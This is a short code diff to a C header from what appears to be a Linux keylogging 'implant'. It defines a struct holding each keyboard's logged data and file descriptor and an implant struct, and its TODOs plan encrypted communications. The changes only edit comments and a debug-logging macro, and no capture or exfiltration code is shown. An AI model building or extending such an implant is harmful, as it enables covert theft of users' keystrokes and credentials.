@@ -5,9 +5,6 @@
 /*
     TODO:
 
-    1. get current local /etc/default/keyboard &
-    translate it manually using struct input_event
-
     2. cleanup select handling so that it doesn't suck massive balls
 
     3. add support for TLS communications / some kind of enc.
@@ -22,6 +19,10 @@
 #include <stdint.h>
 #include <sys/queue.h>
 
+/*
+    represents whatever data is currently logged for a single keyboard
+    also holds its file descriptor
+*/
 typedef struct keyboard_s keyboard_t;
 struct keyboard_s {
     int fd;
@@ -60,13 +61,10 @@ typedef struct implant_s {
 
 #include <stdio.h> /* necessary for the dprintf in the macro */
 
-
 #ifndef DEBUG_LOG
-#define DEBUG_LOG(flag, s, ...) \
+#define DEBUG_LOG(s, ...) \
     do { \
-        if (flag != 0) { \
-            dprintf(2, s, ##__VA_ARGS__); dprintf(2, "\n"); \
-        } \
+        dprintf(2, s, ##__VA_ARGS__); dprintf(2, "\n"); \
     } while (0)
 #endif
 
